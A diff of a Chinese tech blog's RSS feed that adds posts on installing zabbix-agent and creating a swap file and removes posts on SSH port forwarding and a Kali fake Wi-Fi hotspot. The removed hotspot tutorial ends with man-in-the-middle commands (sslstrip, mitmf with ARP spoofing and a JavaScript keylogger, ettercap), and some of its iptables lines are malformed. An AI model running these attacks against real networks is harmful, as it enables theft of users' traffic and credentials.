@@ -8,6 +8,156 @@
         <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
+               <title>Linux中使用yum安装zabbix-agent客户端和配置</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#linux中使用yum安装zabbix-agent客户端和配置&quot; id=&quot;markdown-toc-linux中使用yum安装zabbix-agent客户端和配置&quot;&gt;Linux中使用yum安装zabbix-agent客户端和配置&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-下载zabbix仓库并安装&quot; id=&quot;markdown-toc-1-下载zabbix仓库并安装&quot;&gt;1. 下载zabbix仓库并安装&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-yum安装zabbix-agent客户端&quot; id=&quot;markdown-toc-2-yum安装zabbix-agent客户端&quot;&gt;2. yum安装zabbix-agent客户端&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-编辑zabbix-agent配置文件&quot; id=&quot;markdown-toc-3-编辑zabbix-agent配置文件&quot;&gt;3. 编辑zabbix-agent配置文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-检查服务端口的有效性&quot; id=&quot;markdown-toc-4-检查服务端口的有效性&quot;&gt;4. 检查服务端口的有效性&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#5-启动zabbix-agent客户端服务&quot; id=&quot;markdown-toc-5-启动zabbix-agent客户端服务&quot;&gt;5. 启动zabbix-agent客户端服务&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#6-检查服务是否正常启动&quot; id=&quot;markdown-toc-6-检查服务是否正常启动&quot;&gt;6. 检查服务是否正常启动&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;linux中使用yum安装zabbix-agent客户端和配置&quot;&gt;Linux中使用yum安装zabbix-agent客户端和配置&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-下载zabbix仓库并安装&quot;&gt;1. 下载zabbix仓库并安装&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm
+
+rpm -ivh zabbix-release-2.4-1.el6.noarch.rpm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;2-yum安装zabbix-agent客户端&quot;&gt;2. yum安装zabbix-agent客户端&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yum install zabbix-agent
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;3-编辑zabbix-agent配置文件&quot;&gt;3. 编辑zabbix-agent配置文件&lt;/h2&gt;
+
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/zabbix/zabbixd.conf&lt;/code&gt;编辑打开文件，修改的内容如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hostname		= 客户端主机名称
+SourceIP		= 客户端主机IP
+Server			= Zabbix Server的IP地址
+ServerActive		= Zabbix Server的IP地址
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;4-检查服务端口的有效性&quot;&gt;4. 检查服务端口的有效性&lt;/h2&gt;
+
+&lt;p&gt;编辑&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/services&lt;/code&gt;文件，检查是否存在并添加zabbix客户端端口，如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zabbix-agent    10050/tcp  Zabbix Agent
+zabbix-agent    10050/udp  Zabbix Agent
+zabbix-trapper  10051/tcp  Zabbix Trapper
+zabbix-trapper  10051/udp  Zabbix Trapper
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;若服务器有配置防火墙规则，则添加zabbix-agent端口的出入站规则：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -A INPUT -m state --state NEW -m udp -p udp --dport 10050 -j ACCEPT
+iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 10050 -j ACCEPT
+iptables -A INPUT -m state --state NEW -m udp -p udp --dport 10051 -j ACCEPT
+iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 10051 -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;5-启动zabbix-agent客户端服务&quot;&gt;5. 启动zabbix-agent客户端服务&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zabbix_agentd start
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;6-检查服务是否正常启动&quot;&gt;6. 检查服务是否正常启动&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 检查是否存在zabbix-agent进程&lt;/span&gt;
+ps -ef | grep zabbix
+
+&lt;span class=&quot;c&quot;&gt;# 检查10050端口是否处于监听状态&lt;/span&gt;
+netstat -an | grep 10050
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Wed, 15 Feb 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/02/zabbix-agent-install/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/02/zabbix-agent-install/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Linux增加swap分区</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#linux增加swap分区&quot; id=&quot;markdown-toc-linux增加swap分区&quot;&gt;Linux增加swap分区&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-何为swap分区&quot; id=&quot;markdown-toc-1-何为swap分区&quot;&gt;1. 何为swap分区&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-创建分区&quot; id=&quot;markdown-toc-2-创建分区&quot;&gt;2. 创建分区&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-转换为swap分区&quot; id=&quot;markdown-toc-3-转换为swap分区&quot;&gt;3. 转换为swap分区&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-使swap分区有效&quot; id=&quot;markdown-toc-4-使swap分区有效&quot;&gt;4. 使swap分区有效&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#5-检查swap分区&quot; id=&quot;markdown-toc-5-检查swap分区&quot;&gt;5. 检查swap分区&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#6-配置启动自动挂载&quot; id=&quot;markdown-toc-6-配置启动自动挂载&quot;&gt;6. 配置启动自动挂载&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;linux增加swap分区&quot;&gt;Linux增加swap分区&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-何为swap分区&quot;&gt;1. 何为swap分区&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;swap&lt;/strong&gt;分区在系统的物理内存不够用的时候，把硬盘空间中的一部分空间释放出来，以供当前运行的程序使用。那些被释放的空间可能来自一些很长时间没有什么操作的程序，这些被释放的空间被临时保存到swap分区中，等到那些程序要运行时，再从swap分区中恢复保存的数据到内存中。&lt;/p&gt;
+
+&lt;h2 id=&quot;2-创建分区&quot;&gt;2. 创建分区&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 创建一个512M的/home/swap分区，文件大小为51200个block,1个block为1k&lt;/span&gt;
+dd &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/swap &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1024 &lt;span class=&quot;nv&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;512000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;上述命令需要以&lt;strong&gt;root&lt;/strong&gt;账号执行&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;3-转换为swap分区&quot;&gt;3. 转换为swap分区&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkswap /home/swap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;4-使swap分区有效&quot;&gt;4. 使swap分区有效&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;swapon /home/swap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;5-检查swap分区&quot;&gt;5. 检查swap分区&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;free -m
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;6-配置启动自动挂载&quot;&gt;6. 配置启动自动挂载&lt;/h2&gt;
+
+&lt;p&gt;编辑&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/fstab&lt;/code&gt;文件，添加swap分区配置，如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/swap	swap	swap	defaults	0 0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Fri, 10 Feb 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/02/linux-add-swap-space/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/02/linux-add-swap-space/</guid>  
+               </item>  
+          
+            <item>  
                <title>Centos7中NFS的配置及使用方法</title>  
                <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#centos7中nfs的配置及使用方法&quot; id=&quot;markdown-toc-centos7中nfs的配置及使用方法&quot;&gt;Centos7中NFS的配置及使用方法&lt;/a&gt;    &lt;ul&gt;
@@ -541,192 +691,6 @@ site:example.com filetype:asp
                <pubDate>Sun, 08 Jan 2017 00:00:00 +0800</pubDate>  
                <link>http://localhost:4000/2017/01/google-hack-syntax/</link>  
                <guid isPermaLink="true">http://localhost:4000/2017/01/google-hack-syntax/</guid>  
-               </item>  
-          
-            <item>  
-               <title>Kali中使用Aircrack-ng和Dnsmasq工具创建伪AP热点</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#kali中使用aircrack-ng和dnsmasq工具创建伪ap热点&quot; id=&quot;markdown-toc-kali中使用aircrack-ng和dnsmasq工具创建伪ap热点&quot;&gt;Kali中使用Aircrack-ng和Dnsmasq工具创建伪AP热点&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1必须工具&quot; id=&quot;markdown-toc-1必须工具&quot;&gt;1.必须工具&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2查看无线网卡并启动监听&quot; id=&quot;markdown-toc-2查看无线网卡并启动监听&quot;&gt;2.查看无线网卡并启动监听&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3创建无线ap热点&quot; id=&quot;markdown-toc-3创建无线ap热点&quot;&gt;3.创建无线AP热点&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4创建虚拟网卡及网关&quot; id=&quot;markdown-toc-4创建虚拟网卡及网关&quot;&gt;4.创建虚拟网卡及网关&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#5编辑dnsmasq配置并启动&quot; id=&quot;markdown-toc-5编辑dnsmasq配置并启动&quot;&gt;5.编辑Dnsmasq配置并启动&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#6开启ip转发并设置iptables转发规则&quot; id=&quot;markdown-toc-6开启ip转发并设置iptables转发规则&quot;&gt;6.开启IP转发并设置IPTables转发规则&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#后续可以做什么&quot; id=&quot;markdown-toc-后续可以做什么&quot;&gt;后续可以做什么？&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;kali中使用aircrack-ng和dnsmasq工具创建伪ap热点&quot;&gt;Kali中使用Aircrack-ng和Dnsmasq工具创建伪AP热点&lt;/h1&gt;
-
-&lt;h2 id=&quot;1必须工具&quot;&gt;1.必须工具&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;Aircrack-ng&lt;/li&gt;
-  &lt;li&gt;Dnsmasq&lt;/li&gt;
-  &lt;li&gt;Wireless Adapter&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;Aircrack-ng&lt;/strong&gt;：Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a，802.11b，802.11g的数据。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Dnsmasq&lt;/strong&gt;：DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Wireless Adapter&lt;/strong&gt;：无线网卡，伪装AP热点无线一个无线网卡，建议使用外置的无线网卡。&lt;/p&gt;
-
-&lt;h2 id=&quot;2查看无线网卡并启动监听&quot;&gt;2.查看无线网卡并启动监听&lt;/h2&gt;
-&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;airmon-ng&lt;/code&gt;命令查看当前可用的无线网卡信息，如wlan0
-使用&lt;code class=&quot;highlighter-rouge&quot;&gt;airmon-ng start [网卡名称]&lt;/code&gt;启动无线网卡为监听模式，得到wlan0mon&lt;/p&gt;
-
-&lt;h2 id=&quot;3创建无线ap热点&quot;&gt;3.创建无线AP热点&lt;/h2&gt;
-&lt;p&gt;使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;airbase-ng -e [AP_NAME] -c [channel] wlan0mon&lt;/code&gt;创建无线AP热点，如：&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airbase-ng -e FreeWifi -c 6 wlan0mon
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;此时可以扫描到创建的无线热点，但是不能连接去。&lt;/p&gt;
-
-&lt;h2 id=&quot;4创建虚拟网卡及网关&quot;&gt;4.创建虚拟网卡及网关&lt;/h2&gt;
-&lt;p&gt;新打开一个终端，执行以下命令创建虚拟网卡及其路由配置&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig at0 10.0.0.1/24 up
-ifconfig at0 mtu 1400
-route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;5编辑dnsmasq配置并启动&quot;&gt;5.编辑Dnsmasq配置并启动&lt;/h2&gt;
-&lt;p&gt;编辑 &lt;strong&gt;dnsmasq&lt;/strong&gt; 配置文件&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/dnsmasq.conf&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;at0
-dhcp-range&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.0.10,10.0.0.250,12h
-dhcp-option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3,10.0.0.1
-dhcp-option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6,10.0.0.1
-&lt;span class=&quot;nv&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8.8.8.8
-log-dhcp
-log-queries
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;启动 &lt;strong&gt;dnsmasq&lt;/strong&gt; 服务&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnsmasq -C /etc/dnsmasq.conf -d
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;6开启ip转发并设置iptables转发规则&quot;&gt;6.开启IP转发并设置IPTables转发规则&lt;/h2&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -flush
-&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &amp;gt; /proc/sys/net/ipv4/ip_forward
-
-iptables -P FORWARD ACCEPT
-iptables -append FORWARD -in-interface at0 ACCEPT
-
-iptables -table -nat -append POSTROUTING -out-interface eth0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;后续可以做什么&quot;&gt;后续可以做什么？&lt;/h2&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -t nat -A PREROUTING -p tcp -destination 80 -j REDIRECT -to-port 10000
-sslstrip -f -p -k 10000
-
-mitmf -i at0 --spoof --arp -gateway 10.0.0.1 --jskeylogger --hsts
-
-ettercap -p -u -T -q -i at0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>  
-               <pubDate>Sun, 08 Jan 2017 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2017/01/aircrack-dnsmasq-fake-ap/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2017/01/aircrack-dnsmasq-fake-ap/</guid>  
-               </item>  
-          
-            <item>  
-               <title>SSH隧道技术-本地端口转发</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#ssh隧道技术-本地端口转发&quot; id=&quot;markdown-toc-ssh隧道技术-本地端口转发&quot;&gt;SSH隧道技术-本地端口转发&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#ssh隧道&quot; id=&quot;markdown-toc-ssh隧道&quot;&gt;SSH隧道&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#本地端口转发&quot; id=&quot;markdown-toc-本地端口转发&quot;&gt;本地端口转发&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#隧道参数&quot; id=&quot;markdown-toc-隧道参数&quot;&gt;隧道参数&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#总结&quot; id=&quot;markdown-toc-总结&quot;&gt;总结&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;ssh隧道技术-本地端口转发&quot;&gt;SSH隧道技术-本地端口转发&lt;/h1&gt;
-
-&lt;h2 id=&quot;ssh隧道&quot;&gt;SSH隧道&lt;/h2&gt;
-
-&lt;p&gt;隧道是一种把一种网络协议封装进另外一种网络协议进行传输的技术。这里我们研究ssh隧道，所以所有的网络通讯都是加密的。又被称作端口转发，因为ssh隧道通常会绑定一个本地端口，所有发向这个端口端口的数据包，都会被加密并透明地传输到远端系统。&lt;/p&gt;
-
-&lt;h2 id=&quot;本地端口转发&quot;&gt;本地端口转发&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;本地端口转发&lt;/strong&gt;是将某个内网中的服务端口映射到本地中，访问映射的本地端口即可实现访问某个内网中的服务。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/local-ssh-tunnel.png&quot; alt=&quot;ssh-tunnel-local&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;如上图，本地的&lt;strong&gt;192.168.1.150&lt;/strong&gt;的机器希望访问另一个内网的&lt;strong&gt;10.132.37.150&lt;/strong&gt;机器上的oracle数据库，前提是这里有&lt;strong&gt;121.199.9.15&lt;/strong&gt;的ssh访问权。在本机&lt;code class=&quot;highlighter-rouge&quot;&gt;Localhost&lt;/code&gt;上建立本地隧道的语句如下：&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 语法规则&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# ssh &amp;lt;参数&amp;gt; &amp;lt;本地映射端口&amp;gt;:&amp;lt;内网服务器&amp;gt;:&amp;lt;内网服务端口&amp;gt; &amp;lt;SSH服务&amp;gt; &amp;lt;SSH服务端口&amp;gt;&lt;/span&gt;
-ssh -N -f -L 1521:10.132.37.150:1521 root@121.199.9.15 -p 43221
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;执行完上述命令后，ssh本地隧道进程会后台执行，且已经开放了1521端口，使用数据库工具连接本地1521端口即可访问数据库服务。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;检查本地是否正确映射&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 查看本地1521端口是否正确打开&lt;/span&gt;
-wangjun[192] /Users/wangjun &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat -an | grep 1521
-tcp4       0      0  127.0.0.1.1521         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
-tcp6       0      0  ::1.1521               &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
-&lt;span class=&quot;c&quot;&gt;# 查看ssh隧道进程是否已经执行&lt;/span&gt;
-wangjun[192] /Users/wangjun &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps -ef | grep ssh
-  501  2000     1   0  2:44PM ??         0:00.02 /usr/bin/ssh-agent -l
-  501  4994     1   0 10:47AM ??         0:00.00 ssh -N -f -L 1521:10.132.37.150:1521 bosyun@121.199.9.17 -p 4322
-  501  4999  3105   0 10:47AM ttys001    0:00.00 grep ssh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;隧道参数&quot;&gt;隧道参数&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;名称&lt;/th&gt;
-      &lt;th&gt;含义&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;q&lt;/td&gt;
-      &lt;td&gt;该命令进入安全模式&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;T&lt;/td&gt;
-      &lt;td&gt;该命令不占用shell&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;N&lt;/td&gt;
-      &lt;td&gt;该命令不执行远程命令&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;f&lt;/td&gt;
-      &lt;td&gt;命令在后台执行&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;D&lt;/td&gt;
-      &lt;td&gt;socket5服务器地址和端口&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;L&lt;/td&gt;
-      &lt;td&gt;本地映射端口&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
-
-&lt;p&gt;除了上面提到的远程端口转发，SSH隧道技术还有远程端口转发及动态端口转发，根据实际情况网上参考即可。&lt;/p&gt;
-</description>  
-               <pubDate>Wed, 04 Jan 2017 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2017/01/ssh-tunnel-local/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2017/01/ssh-tunnel-local/</guid>  
                </item>  
           
     </channel>  
